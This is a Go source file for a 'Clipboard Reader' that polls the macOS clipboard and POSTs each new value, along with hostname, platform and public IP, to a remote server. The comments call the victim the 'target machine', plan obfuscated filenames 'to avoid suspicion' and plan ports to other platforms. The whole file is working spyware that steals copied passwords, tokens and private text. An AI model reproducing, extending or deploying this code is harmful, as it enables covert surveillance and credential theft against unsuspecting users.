/*
Product: Clipboard Reader
Description: Reads the clipbaord and relays the information
to a server
Author: Benjamin Norman 2023
*/

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/shirou/gopsutil/v3/host"
)

var (
	previousData  = ""
	hostname      = ""
	ipAddress     = ""
	platform      = ""
	apiKey        = "API KEY CHANGE ME"
	serverAddress = "http://127.0.0.1:8080/clipboard_incoming"
)

// Add the funcs for Windows and Linux so it is platform agnostic and just needs to
// be compiled for the target platform.

func darwin_capture() string {
	/*
		Records the contents of the clipboard for
		MacOS
	*/
	clipboardCommand := exec.Command("pbpaste")
	data, err := clipboardCommand.Output()
	if err != nil {
		return "Error fetching clipboard data"
	}
	return string(data)
}

func data_transfer(data string, ipAddress string, hostname string, platform string) {
	/*
		Sends the data to the target server as a POST
		request with a JSON body
	*/

	// Encode the JSON data
	postBody, _ := json.Marshal(map[string]string{
		"apiKey":    apiKey,
		"ipAddress": ipAddress,
		"hostname":  hostname,
		"platform":  platform,
		"data":      data,
	})
	responseBody := bytes.NewBuffer(postBody)
	resp, err := http.Post(serverAddress, "application/json", responseBody)

	if err != nil {
		log.Fatalf("An Error Occured %v", err)
		fmt.Println(err)
	}
	defer resp.Body.Close()
}

func fetch_ip_address() (ipAddress string) {

	// Fetches the public IP address of the target machine

	resp, err := http.Get("https://api.ipify.org?format=json")

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}
	// Convert the body response from string into a JSON obj
	var jsonMap map[string]interface{}
	json.Unmarshal([]byte(string(body)), &jsonMap)
	ipAddress = jsonMap["ip"].(string)

	return ipAddress
}

func main() {

	// Begin by capturing the Hostname, platform and public IP Address

	hostStat, _ := host.Info()

	hostname = hostStat.Hostname
	platform = fmt.Sprintf("%s %s", hostStat.Platform, hostStat.PlatformVersion)
	ipAddress = fetch_ip_address()

	// Also have some error handling for data that isn't able to be sent through, perhaps store it in a
	// temp file for later sending later when the connection is restored.

	// Store the temp file under a different name to avoid suspicion, also use an obfuscated filename, perhaps one that is hashed
	// using the API key as the decryption key

	if runtime.GOOS == "darwin" {
		// Remove this infinite loop, it's just smelly code. Replace with a conditional loop that possibly
		// works off of whether the data is being received by the server or is timing out. Or if there is no valid internet connection.
		for true {
			capturedData := darwin_capture()
			if capturedData == previousData {
				continue
			} else if capturedData != previousData {
				previousData = capturedData
				data_transfer(capturedData, ipAddress, hostname, platform)
			}
			time.Sleep(3 * time.Second)
		}
	} else {
		os.Exit(1)
	}
}
